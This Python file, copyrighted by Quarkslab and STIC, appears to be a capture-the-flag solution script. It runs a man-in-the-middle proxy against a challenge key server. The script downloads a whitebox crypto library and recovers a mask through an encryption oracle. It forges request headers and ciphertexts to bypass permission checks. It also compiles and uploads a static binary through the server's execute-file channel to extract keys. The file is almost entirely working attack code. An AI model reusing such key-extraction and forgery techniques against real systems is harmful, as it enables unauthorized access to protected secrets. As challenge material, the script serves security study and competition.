#!/usr/bin/env python3

# Copyright 2021 Nicolas Surbayrole
# Copyright 2021 Quarkslab
# Copyright 2021 Association STIC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import datetime
from enum import IntEnum, unique
from hashlib import sha256
import json
import os
import multiprocessing as mp
from solver import Tracer
import socket
import struct
import tempfile
import time
import traceback
import urllib.request
import subprocess
import tempfile
from hexdump import hexdump

@unique
class ReqType(IntEnum):
    CHECK = 0
    GETKEY = 1
    REQ_EXEC_CODE = 2
    REQ_EXEC_FILE = 3


@unique
class RespType(IntEnum):
    ACK = 0
    CHECK_OK = 1
    CHECK_EXPIRED = 2
    GETKEY_OK = 3
    GETKEY_EXPIRED = 4
    GETKEY_INVALID_PERMS = 5
    GETKEY_UNKNOW = 6
    GETKEY_DEBUG_DEVICE = 7
    EXEC_CODE_OK = 8
    EXEC_CODE_ERROR = 9
    EXEC_FILE_KEY_OK = 10
    EXEC_FILE_BAD_KEY = 11
    EXEC_FILE_OK = 12
    EXEC_FILE_ERROR = 13

    REQUEST_ERROR = 0xfe
    UNEXPECTED_ERROR = 0xff


def connect_key_serv(ctx):
    if ctx['rsock'] is not None:
        ctx['rsock'].close()

    rsock = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
    rsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    rsock.connect(ctx['rsock_addr'])

    print("connected to {}:{}".format(*ctx['rsock_addr']))

    header = rsock.recv(4, socket.MSG_WAITALL)

    if header != b'STIC':
        print("Fail recevied header: exit")
        os.exit(1)

    ctx['rsock'] = rsock
    ctx['rsock_timeout'] = int(time.time()) + 3500

    print("connection ready")


def get_ident_getter(ident):

    with open("get_key.c", "r") as f:
        c = f.read()

    c = c.replace("uint64_t ident = 0x0011223344deed;", "uint64_t ident = 0x{:x};".format(ident))

    with tempfile.TemporaryDirectory() as builddir:
        with open(builddir + "/input.c", "w") as f:
            f.write(c)

        subprocess.run(["gcc", "-static", "-o", builddir + "/output", builddir + "/input.c"], check=True)

        with open(builddir + "/output", 'rb') as f:
            return f.read()

def get_key_with_exec(ident, ctx):
    PASS_RESOLV = b"expand 32-byte kb\xcc'=\xe8\x90U\x81\xc4\xfa\xc9\x1c\xbeE\x104\x1a\t\x16\xca\xfa\x05\x14\xf6\x80\xe4`J\xa8\x97\xba\xd4\xadb\xa0-\xcd\x9b5t\x87\xf6z\xb4q4\xb6\x97\x0e\x03\x05\n\x08\x04\t\x0b\x00\x0c\r\x07\x0f\x02\x06\x01"

    binary = get_ident_getter(ident)

    header = gen_zero_headers(ctx)

    ctx['rsock'].send(bytes([ReqType.REQ_EXEC_FILE.value]) + header + PASS_RESOLV)

    r = ctx['rsock'].recv(1, socket.MSG_WAITALL)
    try:
        resType = RespType(int(r[0]))
    except ValueError:
        print("reqexec_file RESPONSE_ERROR unknown reqType", r)
        return None

    print("recv {}".format(resType))
    if resType != RespType.EXEC_FILE_KEY_OK:
        return None

    print("send binary len = {}".format(len(binary)))
    ctx['rsock'].send(struct.pack('<Q', len(binary)) + binary)

    r = ctx['rsock'].recv(1, socket.MSG_WAITALL)
    try:
        resType = RespType(int(r[0]))
    except ValueError:
        print("reqexec_file RESPONSE_ERROR unknown reqType", r)
        return None

    print("recv {}".format(resType))
    if resType != RespType.EXEC_FILE_OK:
        return None

    err = b""
    err_end = False
    while not err_end:
        err += ctx['rsock'].recv(1024)
        err_end = err.endswith(b"---EXEC OUTPUT END---\n")

    l = err.decode('ascii').split('\n')[1]
    print("get {}".format(l))
    if l.startswith('key: '):
        r = bytes.fromhex(l[5:])
        if r != bytes([0] * 16):
            return r
        print("Error null key")

    return None

def getResp(ctx):
    res = ctx['rsock'].recv(1, socket.MSG_WAITALL)

    try:
        respType = RespType(int(res[0]))
    except ValueError:
        print("reqCheck unknown respType : {}".format(int(respType)))
        sock.send(bytes([RespType.REQUEST_ERROR.value]))
        return None, res

    if respType in [RespType.CHECK_OK, RespType.CHECK_EXPIRED, RespType.GETKEY_OK]:
        res += ctx['rsock'].recv(16, socket.MSG_WAITALL)
    return respType, res

def oracle(m, ctx):
    ctx['rsock'].send(bytes([ReqType.CHECK.value]) + m)
    respType, res = getResp(ctx)
    assert respType in [RespType.CHECK_OK, RespType.CHECK_EXPIRED]
    return res[1:]


def create_solver(ctx):
    response = urllib.request.urlopen(ctx['wb_address'])
    data = response.read()

    with tempfile.NamedTemporaryFile(suffix='.so', prefix='lib') as f:
        f.write(data)
        solver = Tracer(f.name)

    solver.generate_mask(lambda m: oracle(m + solver.wb_ident, ctx))

    return solver

def gen_zero_headers(ctx):
    ts = int(time.time()) - 1800
    if ctx['solver'] == None or struct.unpack('<I', ctx['solver'].wb_ident)[0] < ts:
        if ctx['solver'] != None:
            del ctx['solver']
        ctx['solver'] = create_solver(ctx)

    return ctx['solver'].encryptAny(bytes([0] * 16)) + ctx['solver'].wb_ident

def reqCheck(sock, address, ctx):
    payload = sock.recv(20, socket.MSG_WAITALL)
    if len(payload) != 20:
        print("reqCheck REQUEST_ERROR")
        sock.send(bytes([RespType.REQUEST_ERROR.value]))
        return

    print("CHECK request payload:{} ident:{}".format(payload[:16].hex(), payload[16:].hex()))

    m = bytes([ReqType.CHECK.value]) + payload
    ctx['rsock'].send(m)

    respType, res = getResp(ctx)

    sock.send(res)
    print("{}: {}".format(respType, res[1:].hex()))
    return

def reqGetKey(sock, address, ctx):
    payload = sock.recv(20, socket.MSG_WAITALL)
    if len(payload) != 20:
        print("reqGetKey REQUEST_ERROR")
        sock.send(bytes([RespType.REQUEST_ERROR.value]))
        return

    print("GETKEY request payload:{} ident:{}".format(payload[:16].hex(), payload[16:].hex()))

    if ctx['solver'] == None or ctx['solver'].wb_ident != payload[16:]:
        if ctx['solver'] != None:
            del ctx['solver']
        ctx['solver'] = create_solver(ctx)

    if ctx['solver'].wb_ident != payload[16:]:
        print("Return GETKEY_EXPIRED to reload whitebox")
        sock.send(bytes([RespType.GETKEY_EXPIRED.value]))
        return

    m = bytes([ReqType.GETKEY.value]) + payload
    ctx['rsock'].send(m)

    respType, res = getResp(ctx)

    if respType == RespType.GETKEY_INVALID_PERMS:
        print("{}: {}".format(respType, res[1:].hex()))
        m = oracle(payload, ctx)
        print("Use solver on {}".format(m.hex()))
        clear = m[:8] + bytes([0] * 8)
        cipher = ctx['solver'].encryptAny(clear)
        print("get {} for {}".format(cipher.hex(), clear.hex()))

        to_send = bytes([ReqType.GETKEY.value]) + cipher + payload[16:]
        ctx['rsock'].send(to_send)

        respType, res = getResp(ctx)

        # need perm 0
        if respType == RespType.GETKEY_INVALID_PERMS:
            ident = get_key_with_exec(struct.unpack('<Q', m[:8])[0], ctx)
            if ident != None:
                respType = RespType.GETKEY_OK
                res = bytes([RespType.GETKEY_OK.value]) + ident

    sock.send(res)
    print("{}: {}".format(respType, res[1:].hex()))
    return

def reqExecCode(sock, address, ctx):

    # dummy header, create a valid header
    sock.recv(0x14, socket.MSG_WAITALL)
    header = gen_zero_headers(ctx)

    code_size = sock.recv(8, socket.MSG_WAITALL)
    code = sock.recv(struct.unpack('<Q', code_size)[0], socket.MSG_WAITALL)
    input_size = sock.recv(8, socket.MSG_WAITALL)
    input_buff = sock.recv(struct.unpack('<Q', input_size)[0], socket.MSG_WAITALL)
    output_size = sock.recv(8, socket.MSG_WAITALL)
    output_size_ = struct.unpack('<Q', output_size)[0]

    print("send code")
    print(hexdump(code, 'return'))

    ctx['rsock'].send(bytes([ReqType.REQ_EXEC_CODE.value]) + header + code_size + code + input_size + input_buff + output_size)

    c = ctx['rsock'].recv(1, socket.MSG_WAITALL)
    sock.send(c)

    if int(c[0]) != RespType.EXEC_CODE_OK.value:
        err = RespType(c[0])
        print("reqexec_code received {}".format(err))
        return

    output = b""
    output_end = False
    while not output_end:
        output += ctx['rsock'].recv(1024)
        output_end = output.endswith(b"---DEBUG LOG END---\n")

    print("reqexec_code confirm")
    print("output:")
    print(hexdump(output[:output_size_], 'return'))
    print("stderr:")
    print(output[output_size_:].decode('ascii'))

    sock.send(output)
    return


def reqExecFile(sock, address, ctx):

    sock.recv(0x14, socket.MSG_WAITALL)
    header = gen_zero_headers(ctx)

    input_buff = sock.recv(0x50, socket.MSG_WAITALL)

    print("begin send exec_file")
    print(hexdump(input_buff, 'return'))

    ctx['rsock'].send(bytes([ReqType.REQ_EXEC_FILE.value]) + header + input_buff)

    r = ctx['rsock'].recv(1, socket.MSG_WAITALL)
    try:
        resType = RespType(int(r[0]))
    except ValueError:
        print("reqexec_file RESPONSE_ERROR unknown reqType", r)
        sock.send(bytes([RespType.REQUEST_ERROR.value]))
        return

    print("recv {}".format(resType))
    sock.send(r)
    if resType != RespType.EXEC_FILE_KEY_OK:
        return

    f_size = sock.recv(0x8, socket.MSG_WAITALL)
    f_buff = sock.recv(struct.unpack('<Q', f_size)[0], socket.MSG_WAITALL)

    print("send binary len = {}".format(struct.unpack('<Q', f_size)[0]))
    ctx['rsock'].send(f_size + f_buff)

    r = ctx['rsock'].recv(1, socket.MSG_WAITALL)
    try:
        resType = RespType(int(r[0]))
    except ValueError:
        print("reqexec_file RESPONSE_ERROR unknown reqType", r)
        sock.send(bytes([RespType.REQUEST_ERROR.value]))
        return

    print("recv {}".format(resType))
    sock.send(r)
    if resType != RespType.EXEC_FILE_OK:
        return

    err = b""
    err_end = False
    while not err_end:
        err += ctx['rsock'].recv(1024)
        err_end = err.endswith(b"---EXEC OUTPUT END---\n")

    print("msg :")
    print(err)

    sock.send(err)
    return


def process_main(sock, address, ctx):
    try:
        print("Begin connexion {}".format(address))
        sock.send(b'STIC');
        while True:
            m = sock.recv(1, socket.MSG_WAITALL)
            if len(m) < 1:
                sock.send(bytes([RespType.REQUEST_ERROR.value]))
                sock.close()
                return

            req = int(m[0])
            try:
                reqType = ReqType(req)
            except ValueError:
                print("process_main REQUEST_ERROR unknown reqType")
                sock.send(bytes([RespType.REQUEST_ERROR.value]))
                continue

            with ctx['lock']:
                if ctx['rsock_timeout'] < int(time.time()):
                    print("recreate connexion")
                    connect_key_serv(ctx)

                if reqType == ReqType.CHECK:
                    reqCheck(sock, address, ctx)
                elif reqType == ReqType.GETKEY:
                    reqGetKey(sock, address, ctx)
                elif reqType == ReqType.REQ_EXEC_CODE:
                    reqExecCode(sock, address, ctx)
                elif reqType == ReqType.REQ_EXEC_FILE:
                    reqExecFile(sock, address, ctx)
                else:
                    print("process_main REQUEST_ERROR no handler for reqType {}".format(reqType))
                    sock.send(bytes([RespType.REQUEST_ERROR.value]))
    finally:
        print("End connexion {}".format(address))
        sock.close()

def worker(sock, ctx):
    cont = True
    while cont:
        client = None
        try:
            client, address = sock.accept()
            process_main(client, address, ctx)
        except KeyboardInterrupt:
            cont = False
        except Exception as e:
            traceback.print_exc()
        if client != None:
            client.close()

def main():
    import argparse
    parser = argparse.ArgumentParser()

    class hexArg:

        def __call__(self, raw):
            try:
                b = bytes.fromhex(raw)
            except ValueError:
                raise argparse.ArgumentTypeError('Not an hexa value')

            return b

    #parser.add_argument("-W", "--workers", type=int, help="worker", default=1)
    parser.add_argument("-l", "--listen-port", type=int, help="listening port", default=65430)
    parser.add_argument("-a", "--remote-address", type=str, default="127.0.0.1")
    parser.add_argument("-p", "--remote-port", type=int, default=1337)
    parser.add_argument("-w", "--wb-address", type=str, default='http://127.0.0.1:8080/api/guest.so')

    args = parser.parse_args()

    context = {
        "lock": mp.Lock(),
        "rsock": None,
        "rsock_addr": (args.remote_address, args.remote_port),
        "rsock_timeout": 0,
        "wb_address": args.wb_address,
        "solver": None,
    }

    connect_key_serv(context)

    sock = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("0.0.0.0", args.listen_port))
    #sock.listen(8 * args.workers)
    sock.listen(8)
    print("connection ready, listen on {}".format(args.listen_port))


    worker(sock, context)
    #workers = [mp.Process(target=worker, args=(sock, context), daemon=True) for i in range(args.workers)]

    #for w in workers:
    #    w.start()

    #while True:
    #    for i in range(len(workers)):
    #        workers[i].join(0.001)
    #        if workers[i].exitcode != None:
    #            workers[i] = mp.Process(target=worker, args=(sock, context), daemon=True)
    #            workers[i].start()
    #    time.sleep(1)

if __name__ == '__main__':
    main()
